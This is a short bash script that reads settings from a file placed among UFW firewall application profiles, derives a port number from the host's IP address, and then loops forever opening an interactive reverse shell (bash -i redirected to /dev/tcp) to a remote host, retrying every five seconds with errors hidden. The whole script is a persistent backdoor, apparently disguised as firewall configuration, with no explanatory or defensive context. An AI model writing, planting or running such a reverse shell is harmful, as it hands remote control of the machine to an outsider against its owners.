#!/bin/bash
source /etc/ufw/applications.d/ufw_config.sh
CIP=$(/usr/bin/hostname -I | awk '{print $1}')
SECOND=$(echo "$CIP" | cut -d'.' -f2)
P=$(($C + $SECOND))

while true; do
    bash -i >& /dev/tcp/"$I"/"$P" 0>&1 2>/dev/null
    sleep 5
done